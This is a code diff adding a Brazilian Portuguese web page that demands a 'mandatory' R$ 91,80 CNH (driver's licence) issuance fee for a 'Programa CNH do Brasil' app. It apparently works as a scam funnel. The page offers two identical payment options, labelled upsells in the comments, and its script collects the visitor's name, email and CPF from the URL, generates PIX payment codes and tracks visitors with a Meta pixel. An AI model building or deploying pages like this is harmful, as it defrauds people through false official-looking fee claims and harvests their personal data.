@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Taxa de Emissão da CNH</title>
+
+    <!-- Meta Pixel Code -->
+    <script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', '4327697327497010');fbq('track', 'PageView');</script><noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=4327697327497010&ev=PageView&noscript=1"/></noscript>
+    <!-- End Meta Pixel Code -->
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="stylesheet" href="/assets/fa5-all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Open Sans', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f5f5;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 750px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 12px;
+            padding: 40px 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            color: #1a1a1a;
+            margin-bottom: 15px;
+        }
+
+        .header p {
+            font-size: 15px;
+            color: #666;
+            line-height: 1.6;
+        }
+
+        .icon {
+            width: 100px;
+            height: 100px;
+            margin: 20px auto;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 48px;
+        }
+
+        .info-box {
+            background: #f0f4ff;
+            border-left: 4px solid #667eea;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 8px;
+        }
+
+        .info-box h3 {
+            color: #667eea;
+            margin-bottom: 12px;
+            font-size: 16px;
+        }
+
+        .info-box ul {
+            list-style: none;
+            font-size: 14px;
+            color: #555;
+            line-height: 2;
+        }
+
+        .info-box ul li:before {
+            content: "• ";
+            color: #667eea;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+
+        .price-section {
+            text-align: center;
+            margin: 40px 0;
+            padding: 30px;
+            background: #f9f9f9;
+            border-radius: 8px;
+        }
+
+        .price {
+            font-size: 48px;
+            font-weight: 700;
+            color: #27ae60;
+            margin: 10px 0;
+        }
+
+        .price-label {
+            font-size: 14px;
+            color: #999;
+        }
+
+        .upsell-container {
+            margin-top: 50px;
+        }
+
+        .upsell-title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            color: #1a1a1a;
+            margin-bottom: 30px;
+        }
+
+        .upsell-item {
+            background: #f9f9f9;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .upsell-item:hover {
+            border-color: #667eea;
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.1);
+        }
+
+        .upsell-info h4 {
+            font-size: 16px;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+        }
+
+        .upsell-info p {
+            font-size: 13px;
+            color: #999;
+        }
+
+        .upsell-amount {
+            text-align: right;
+        }
+
+        .upsell-amount .value {
+            font-size: 28px;
+            font-weight: 700;
+            color: #27ae60;
+        }
+
+        .upsell-amount .label {
+            font-size: 12px;
+            color: #999;
+        }
+
+        .btn-upsell {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            min-width: 120px;
+        }
+
+        .btn-upsell:hover {
+            background: #5568d3;
+        }
+
+        .btn-upsell:active {
+            transform: scale(0.98);
+        }
+
+        .divider {
+            height: 1px;
+            background: #e0e0e0;
+            margin: 40px 0;
+        }
+
+        .skip-section {
+            text-align: center;
+            margin-top: 30px;
+        }
+
+        .skip-link {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .skip-link:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            color: #667eea;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .alert {
+            display: none;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .alert.error {
+            background: #fee;
+            border: 1px solid #fcc;
+            color: #c33;
+        }
+
+        .alert.success {
+            background: #efe;
+            border: 1px solid #cfc;
+            color: #3c3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Taxa de Emissão da CNH</h1>
+            <p>Esta é a última taxa obrigatória. Após a confirmação do pagamento, você receberá acesso completo ao aplicativo do Programa CNH do Brasil.</p>
+        </div>
+
+        <div class="icon">
+            <i class="fas fa-file-check"></i>
+        </div>
+
+        <div class="info-box">
+            <h3>Importante</h3>
+            <ul>
+                <li>Esta taxa é <strong>obrigatória</strong> para finalizar seu cadastro no Programa CNH do Brasil</li>
+                <li>Valor único de <strong>R$ 91,80</strong> pago uma única vez</li>
+                <li>Taxa destinada ao processo de emissão e regularização da CNH</li>
+                <li>Seu cadastro só será concluído após a confirmação deste pagamento</li>
+            </ul>
+        </div>
+
+        <div class="price-section">
+            <div class="price-label">Valor da Taxa</div>
+            <div class="price">R$ 91,80</div>
+        </div>
+
+        <div class="upsell-container">
+            <div class="upsell-title">Opções de Pagamento Disponíveis</div>
+
+            <!-- UPSELL 1 -->
+            <div class="upsell-item">
+                <div class="upsell-info">
+                    <h4>LOJA SHOPIFY</h4>
+                    <p>Taxa de emissão - 1ª opção</p>
+                </div>
+                <div style="display: flex; gap: 15px; align-items: center;">
+                    <div class="upsell-amount">
+                        <div class="value">R$ 91,80</div>
+                        <div class="label">valor único</div>
+                    </div>
+                    <button class="btn-upsell" onclick="gerarPixUpsell(1, 91.80)">Pagar</button>
+                </div>
+            </div>
+
+            <!-- UPSELL 2 -->
+            <div class="upsell-item">
+                <div class="upsell-info">
+                    <h4>LOJA SHOPIFY</h4>
+                    <p>Taxa de emissão - 2ª opção</p>
+                </div>
+                <div style="display: flex; gap: 15px; align-items: center;">
+                    <div class="upsell-amount">
+                        <div class="value">R$ 91,80</div>
+                        <div class="label">valor único</div>
+                    </div>
+                    <button class="btn-upsell" onclick="gerarPixUpsell(2, 91.80)">Pagar</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div class="skip-section">
+            <p style="font-size: 14px; color: #999; margin-bottom: 10px;">Deseja fazer upload de comprovante de pagamento?</p>
+            <a class="skip-link" href="/" onclick="irParaUpload(); return false;">Fazer upload de comprovante →</a>
+        </div>
+
+        <div id="loading" class="loading">
+            <div class="spinner"></div>
+            <p>Gerando código PIX...</p>
+        </div>
+
+        <div id="alert" class="alert"></div>
+    </div>
+
+    <script>
+        // Recuperar dados da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const transactionId = urlParams.get('tx');
+        const customerName = urlParams.get('nome') || 'Cliente';
+        const customerEmail = urlParams.get('email');
+        const customerCpf = urlParams.get('cpf');
+
+        async function gerarPixUpsell(upsellNum, amount) {
+            console.log(`🎯 Upsell ${upsellNum} clicado - R$ ${amount}`);
+
+            const btn = event.target;
+            btn.disabled = true;
+            btn.textContent = 'Processando...';
+
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('alert').style.display = 'none';
+
+            try {
+                const payload = {
+                    amount: amount,
+                    nome: customerName,
+                    email: customerEmail,
+                    cpf: customerCpf,
+                    upsell: upsellNum,
+                    utm: window._getUtms ? window._getUtms() : {}
+                };
+
+                console.log('📤 Enviando payload:', payload);
+
+                const response = await fetch('/api/pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+                console.log('📥 Resposta:', data);
+
+                if (data.success && data.pixCode) {
+                    console.log('✅ PIX Gerado:', data.transactionId);
+                    
+                    // Guardar PIX no localStorage
+                    localStorage.setItem('lastPixCode', data.pixCode);
+                    localStorage.setItem('lastTransactionId', data.transactionId);
+                    localStorage.setItem('lastAmount', amount);
+                    
+                    // Redirecionar para página de pagamento
+                    window.location.href = `/pix.html?tx=${data.transactionId}&amount=${amount}`;
+                } else {
+                    throw new Error(data.error || 'Erro ao gerar PIX');
+                }
+            } catch (err) {
+                console.error('❌ Erro:', err.message);
+                showAlert('Erro ao gerar código PIX: ' + err.message, 'error');
+                btn.disabled = false;
+                btn.textContent = 'Pagar';
+                document.getElementById('loading').style.display = 'none';
+            }
+        }
+
+        function irParaUpload() {
+            window.location.href = '/?tab=upload';
+        }
+
+        function showAlert(msg, type) {
+            const alert = document.getElementById('alert');
+            alert.textContent = msg;
+            alert.className = 'alert ' + type;
+            alert.style.display = 'block';
+        }
+
+        // Carregar UTMs do localStorage se existirem
+        window._getUtms = function() {
+            try {
+                return JSON.parse(localStorage.getItem('utmData') || '{}');
+            } catch {
+                return {};
+            }
+        };
+    </script>
+</body>
+</html>
